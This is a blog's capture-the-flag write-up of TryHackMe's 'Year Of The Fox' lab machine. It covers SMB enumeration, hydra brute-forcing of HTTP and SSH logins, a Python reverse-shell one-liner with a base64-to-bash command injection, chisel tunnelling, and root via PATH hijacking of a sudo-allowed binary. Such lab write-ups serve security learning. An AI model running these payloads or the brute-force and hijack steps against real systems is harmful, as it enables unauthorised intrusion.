@@ -1,0 +1,332 @@
+<!doctype html><html lang=en>
+<head>
+<title>
+Year Of The Fox - Write Up ::
+Lanfran02 - Blog — Where write-ups are made.
+</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="Link Level Creator     Here Hard MuirlandOracle    Reconn Let&amp;rsquo;s start with a normal nmap scan.
+╰─ lanfran@parrot ❯ sudo nmap 10.10.174.23 -p- -sS --min-rate 5000 -n -Pn ─╯ [sudo] password for lanfran: Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-17 12:33 CEST Nmap scan report for 10.">
+<meta name=keywords content="CTF,Writeup,Hacking">
+<meta name=robots content="noodp">
+<link rel=canonical href=/posts/year_of_the_fox/>
+<link rel=stylesheet href=/assets/style.css>
+<link rel=stylesheet href=/style.css>
+<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
+<link rel="shortcut icon" href=/img/favicon.png>
+<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="/posts/year_of_the_fox/cover.jpeg">
+<meta name=twitter:title content="Year Of The Fox - Write Up">
+<meta name=twitter:description content="TryHackMe's hard level machine.">
+<meta property="og:title" content="Year Of The Fox - Write Up">
+<meta property="og:description" content="TryHackMe's hard level machine.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="/posts/year_of_the_fox/"><meta property="og:image" content="/posts/year_of_the_fox/cover.jpeg"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-10-17T12:39:31+02:00">
+<meta property="article:modified_time" content="2021-10-17T12:39:31+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+</head>
+<body class=dark-theme>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/ class=logo style=text-decoration:none>
+<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+<span class=logo__text>Lanfran02</span>
+<span class=logo__cursor></span>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/about>About</a></li>
+<li><a href=/es/>Español</a></li>
+<ul class=menu__sub-inner>
+<li class=menu__sub-inner-more-trigger>
+Write Ups
+<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+</li>
+<ul class="menu__sub-inner-more hidden">
+<li><a href=/tags/hackthebox/>HTB</a></li>
+<li><a href=/tags/tryhackme/>THM</a></li>
+</ul>
+</ul>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/about>About</a></li>
+<li><a href=/es/>Español</a></li>
+<li><a href=/tags/hackthebox/>HTB</a></li>
+<li><a href=/tags/tryhackme/>THM</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>Year Of The Fox - Write Up</h1>
+<div class=post-meta>
+<span class=post-date>
+2021-10-17
+</span>
+<span class=post-author>— Written by Lanfran02</span>
+<span class=post-read-time>— 6 min read</span>
+</div>
+<span class=post-tags>
+<a href=/tags/hydra/>#hydra</a>&nbsp;
+<a href=/tags/rce/>#RCE</a>&nbsp;
+<a href=/tags/chisel/>#chisel</a>&nbsp;
+<a href=/tags/path/>#PATH</a>&nbsp;
+<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
+</span>
+<figure class=post-cover>
+<img src=/posts/year_of_the_fox/cover.jpeg alt="Year Of The Fox - Write Up">
+</figure>
+<div class=post-content>
+<h2>Table of Contents</h2>
+<aside class=table-of-contents><nav id=TableOfContents>
+<ul>
+<li><a href=#reconn>Reconn</a></li>
+<li><a href=#foothold---user>Foothold - User</a></li>
+<li><a href=#root>Root</a></li>
+</ul>
+</nav></aside>
+<table>
+<thead>
+<tr>
+<th>Link</th>
+<th>Level</th>
+<th>Creator</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href=https://tryhackme.com/room/yotf>Here</a></td>
+<td>Hard</td>
+<td><a href=https://tryhackme.com/p/MuirlandOracle>MuirlandOracle</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id=reconn>Reconn</h2>
+<p>Let&rsquo;s start with a normal <code>nmap</code> scan.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ sudo nmap 10.10.174.23 -p- -sS --min-rate <span style=color:#ae81ff>5000</span> -n -Pn                                                                                                ─╯
+<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
+Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times will be slower.
+Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-10-17 12:33 CEST
+Nmap scan report <span style=color:#66d9ef>for</span> 10.10.174.23
+Host is up <span style=color:#f92672>(</span>0.083s latency<span style=color:#f92672>)</span>.
+Not shown: <span style=color:#ae81ff>65532</span> closed ports
+PORT    STATE SERVICE
+80/tcp  open  http
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 24.37 seconds
+</code></pre></div><p>Great! We have a web server and a microsoft-ds service running!</p>
+<p>Let&rsquo;s scan the file sharing server with <code>enum4linux</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ enum4linux 10.10.174.23                                                                                                                           ─╯
+Starting enum4linux v0.8.9 <span style=color:#f92672>(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span style=color:#f92672>)</span> on Sun Oct <span style=color:#ae81ff>17</span> 12:34:44 2021
+
+ <span style=color:#f92672>==========================</span> 
+|    Target Information    |
+ <span style=color:#f92672>==========================</span> 
+Target ........... 10.10.174.23
+RID Range ........ 500-550,1000-1050
+Username ......... <span style=color:#e6db74>&#39;&#39;</span>
+Password ......... <span style=color:#e6db74>&#39;&#39;</span>
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ <span style=color:#f92672>====================================================</span> 
+|    Enumerating Workgroup/Domain on 10.10.174.23    |
+ <span style=color:#f92672>====================================================</span> 
+<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Enumerating users using SID S-1-22-1 and logon username <span style=color:#e6db74>&#39;&#39;</span>, password <span style=color:#e6db74>&#39;&#39;</span>
+S-1-22-1-1000 Unix User<span style=color:#ae81ff>\f</span>ox <span style=color:#f92672>(</span>Local User<span style=color:#f92672>)</span>
+S-1-22-1-1001 Unix User<span style=color:#ae81ff>\r</span>ascal <span style=color:#f92672>(</span>Local User<span style=color:#f92672>)</span>
+<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</code></pre></div><p>Woho! More information! We have 2 users now:
+<code>Fox</code>
+<code>Rascal</code></p>
+<p>So let&rsquo;s go to the web server now.</p>
+<h2 id=foothold---user>Foothold - User</h2>
+<p><img src=login.png alt=login></p>
+<p>Ups, it&rsquo;s requesting us a password and an user, maybe we can bruteforce it with <code>hydra</code> and the users that we found before&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ hydra -l rascal -P /usr/share/wordlists/rockyou.txt -u  -s <span style=color:#ae81ff>80</span>  10.10.174.23 http-head /                                                              ─╯
+Hydra v9.1 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes <span style=color:#f92672>(</span>this is non-binding, these *** ignore laws and ethics anyway<span style=color:#f92672>)</span>.
+
+Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> starting at 2021-10-17 12:38:59
+<span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> http-head auth does not work with every server, better use http-get
+<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>16</span> tasks, <span style=color:#ae81ff>14344399</span> login tries <span style=color:#f92672>(</span>l:1/p:14344399<span style=color:#f92672>)</span>, ~896525 tries per task
+<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking http-head://10.10.174.23:80/
+<span style=color:#f92672>[</span>STATUS<span style=color:#f92672>]</span> 3492.00 tries/min, <span style=color:#ae81ff>3492</span> tries in 00:01h, <span style=color:#ae81ff>14340907</span> to <span style=color:#66d9ef>do</span> in 68:27h, <span style=color:#ae81ff>16</span> active
+<span style=color:#f92672>[</span>80<span style=color:#f92672>][</span>http-head<span style=color:#f92672>]</span> host: 10.10.174.23   login: rascal   password: marinel
+</code></pre></div><p>Yes! It worked! We can now login to the page and see what&rsquo;s inside <em>(BTW, I&rsquo;m not removing the cracked password because this machine changes the password in every reboot&mldr;)</em></p>
+<p><img src=loged.png alt=loged></p>
+<p>Mmmm&mldr; A simple page with an input&mldr;</p>
+<p>After a lot of reserching, we can get a reverse shell from there with this exploit:</p>
+<pre tabindex=0><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your_ip&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' 
+
+-----
+
+&quot;\&quot;;echo &quot;paste your base64 encoded payload here&quot; | base64 -d | bash;\&quot;&quot;
+</code></pre><p>Run it with <code>Burp Suite</code> or even with <code>cURL</code>.</p>
+<p><img src=exploit.png alt=exploited></p>
+<p>And we are in, we now can read the web flag!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@year-of-the-fox:/var/www$ cat web-flag.txt 
+THM<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
+</code></pre></div><p>Digging around, I found that the port <code>22</code> is open and listening but just in for the local machine, so we have to create a tunnel and we can bruteforce it!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ netstat -tulwn
+Active Internet connections <span style=color:#f92672>(</span>only servers<span style=color:#f92672>)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:139             0.0.0.0:*               LISTEN     
+tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 127.0.0.1:22            0.0.0.0:*               LISTEN     
+tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:445             0.0.0.0:*               LISTEN     
+tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::139                  :::*                    LISTEN     
+tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::80                   :::*                    LISTEN     
+tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::445                  :::*                    LISTEN     
+udp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 10.10.255.255:137       0.0.0.0:*                          
+udp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 10.10.174.23:137        0.0.0.0:*                          
+udp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:137             0.0.0.0:*                          
+udp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 10.10.255.255:138       0.0.0.0:*                          
+udp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 10.10.174.23:138        0.0.0.0:*                          
+udp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:138             0.0.0.0:*                          
+udp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 127.0.0.53:53           0.0.0.0:*                          
+udp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 10.10.174.23:68         0.0.0.0:*                          
+raw6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::58                   :::*                    <span style=color:#ae81ff>7</span>          
+$ 
+</code></pre></div><p>Let&rsquo;s create the tunnel now with <code>chisel</code>. <em>Please note that chisel isn&rsquo;t installed on the machine, so I had to upload an static binary.</em></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>Attacker Machine<span style=color:#f92672>]</span>
+
+╰─ lanfran@parrot ❯ ./chisel server -p <span style=color:#ae81ff>4444</span> --reverse &amp;                                                                                                                 ─╯
+<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> <span style=color:#ae81ff>1717758</span>
+2021/10/17 12:56:35 server: Reverse tunnelling enabled                                                                                                                     
+2021/10/17 12:56:35 server: Fingerprint V4me3/cc0B0GtMPIyoYclwAhXCzh24uFYKuxh3M+jcY<span style=color:#f92672>=</span>
+2021/10/17 12:56:35 server: Listening on http://0.0.0.0:4444
+
+--------
+<span style=color:#f92672>[</span>Victim Machine<span style=color:#f92672>]</span>
+
+www-data@year-of-the-fox:/tmp$ ./chisel client 10.9.4.36:4444 R:2222:127.0.0.1:22
+2021/10/17 11:58:01 client: Connecting to ws://10.9.4.36:4444
+2021/10/17 11:58:01 client: Connected <span style=color:#f92672>(</span>Latency 54.77722ms<span style=color:#f92672>)</span>
+</code></pre></div><p>Great, since now we can see the <code>22</code> open port on the machine, on our local port <code>2222</code>, let&rsquo;s brute force with the user <code>fox</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ hydra -l fox -P /usr/share/wordlists/rockyou.txt -u -s <span style=color:#ae81ff>2222</span> 127.0.0.1 ssh                                                                           ─╯
+Hydra v9.1 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes <span style=color:#f92672>(</span>this is non-binding, these *** ignore laws and ethics anyway<span style=color:#f92672>)</span>.
+
+Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> starting at 2021-10-17 12:57:10
+<span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style=color:#ae81ff>4</span>
+<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>16</span> tasks, <span style=color:#ae81ff>14344399</span> login tries <span style=color:#f92672>(</span>l:1/p:14344399<span style=color:#f92672>)</span>, ~896525 tries per task
+<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking ssh://127.0.0.1:2222/
+<span style=color:#f92672>[</span>STATUS<span style=color:#f92672>]</span> 177.00 tries/min, <span style=color:#ae81ff>177</span> tries in 00:01h, <span style=color:#ae81ff>14344223</span> to <span style=color:#66d9ef>do</span> in 1350:41h, <span style=color:#ae81ff>16</span> active
+<span style=color:#f92672>[</span>2222<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 127.0.0.1   login: fox   password: roberto
+</code></pre></div><p>Great! we have the password, let&rsquo;s now login via <code>ssh</code> and read the user&rsquo;s flag.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ ssh -p <span style=color:#ae81ff>2222</span> fox@localhost                                                                                                                           ─╯
+fox@localhost<span style=color:#e6db74>&#39;s password: 
+</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>	__   __                       __   _   _            _____         
+</span><span style=color:#e6db74>	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  ___|____  __
+</span><span style=color:#e6db74>	 \ V / _ \/ _` | &#39;</span>__|  / _ <span style=color:#ae81ff>\|</span> |_  | __| <span style=color:#960050;background-color:#1e0010>&#39;</span>_ <span style=color:#ae81ff>\ </span>/ _ <span style=color:#ae81ff>\ </span>| |_ / _ <span style=color:#ae81ff>\ \/</span> /
+	  | |  __/ <span style=color:#f92672>(</span>_| | |    | <span style=color:#f92672>(</span>_<span style=color:#f92672>)</span> |  _| | |_| | | |  __/ |  _| <span style=color:#f92672>(</span>_<span style=color:#f92672>)</span> &gt;  &lt; 
+	  |_|<span style=color:#ae81ff>\_</span>__|<span style=color:#ae81ff>\_</span>_,_|_|     <span style=color:#ae81ff>\_</span>__/|_|    <span style=color:#ae81ff>\_</span>_|_| |_|<span style=color:#ae81ff>\_</span>__| |_|  <span style=color:#ae81ff>\_</span>__/_/<span style=color:#ae81ff>\_\
+</span><span style=color:#ae81ff></span>
+
+                                                                  
+fox@year-of-the-fox:~$ cat user-flag.txt 
+THM<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
+fox@year-of-the-fox:~$ 
+</code></pre></div><h2 id=root>Root</h2>
+<p>To escalate to root, we will need to find a way to exploit a binary, that we can run with sudo.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>fox@year-of-the-fox:~$ sudo -l
+Matching Defaults entries <span style=color:#66d9ef>for</span> fox on year-of-the-fox:
+    env_reset, mail_badpass
+
+User fox may run the following commands on year-of-the-fox:
+    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/sbin/shutdown
+</code></pre></div><p>A few things going on here. The <code>secure_path</code> isn&rsquo;t set, and we have a binary, that after doing a little reversing, we can see that is using another binary, <code>poweroff</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ strings shutdown                                                                                                                                                                    ─╯
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+system
+__cxa_finalize
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+AWAVI
+AUATL
+<span style=color:#f92672>[]</span>A<span style=color:#ae81ff>\A</span><span style=color:#f92672>]</span>A^A_
+poweroff.  &lt;------- HERE
+</code></pre></div><p>So, to recap, we can create a malicious binary to act as <code>poweroff</code> and set the <code>$PATH</code> to our current working directory. So let&rsquo;s do it!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>fox@year-of-the-fox:/tmp$ cp /bin/bash poweroff
+fox@year-of-the-fox:/tmp$ sudo <span style=color:#e6db74>&#34;PATH=/tmp:</span>$PATH<span style=color:#e6db74>&#34;</span> /usr/sbin/shutdown
+root@year-of-the-fox:/tmp# id
+uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
+</code></pre></div><p>And we got it!
+Now for the remaining root&rsquo;s flag, let&rsquo;s read the file that&rsquo;s on <code>/home/rascal/</code> and remove all the break lines.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@year-of-the-fox:/tmp# ls -la /home/rascal/
+total <span style=color:#ae81ff>24</span>
+drwxr-x--- <span style=color:#ae81ff>2</span> rascal rascal <span style=color:#ae81ff>4096</span> Jun  <span style=color:#ae81ff>1</span>  <span style=color:#ae81ff>2020</span> .
+drwxr-xr-x <span style=color:#ae81ff>4</span> root   root   <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2020</span> ..
+lrwxrwxrwx <span style=color:#ae81ff>1</span> root   root      <span style=color:#ae81ff>9</span> May <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2020</span> .bash_history -&gt; /dev/null
+-rw-r--r-- <span style=color:#ae81ff>1</span> rascal rascal  <span style=color:#ae81ff>220</span> Apr  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2018</span> .bash_logout
+-rw-r--r-- <span style=color:#ae81ff>1</span> rascal rascal <span style=color:#ae81ff>3771</span> Apr  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2018</span> .bashrc
+-r-------- <span style=color:#ae81ff>1</span> rascal root    <span style=color:#ae81ff>158</span> Jun  <span style=color:#ae81ff>9</span>  <span style=color:#ae81ff>2020</span> .did-you-think-I-was-useless.root
+-rw-r--r-- <span style=color:#ae81ff>1</span> rascal rascal  <span style=color:#ae81ff>807</span> Apr  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2018</span> .profile
+root@year-of-the-fox:/tmp# cat /home/rascal/.did-you-think-I-was-useless.root | tr -d <span style=color:#e6db74>&#39;\n&#39;</span>
+THM<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]]}</span>Here<span style=color:#960050;background-color:#1e0010>&#39;</span>s the prize:YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMwMwo<span style=color:#f92672>=</span>Good luck!
+</code></pre></div><p>And we rooted the machine!</p>
+<p>That&rsquo;s all from my side, hope you find this helpful!</p>
+</div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=/posts/lockdown/>
+<span class=button__icon>←</span>
+<span class=button__text>Lockdown - Write Up</span>
+</a>
+</span>
+<span class="button next">
+<a href=/posts/ide/>
+<span class=button__text>IDE - Write Up</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class="copyright copyright--user">Lanfran02</div>
+</div>
+</footer>
+<script src=/assets/main.js></script>
+<script src=/assets/prism.js></script>
+</div>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
+</body>
+</html>
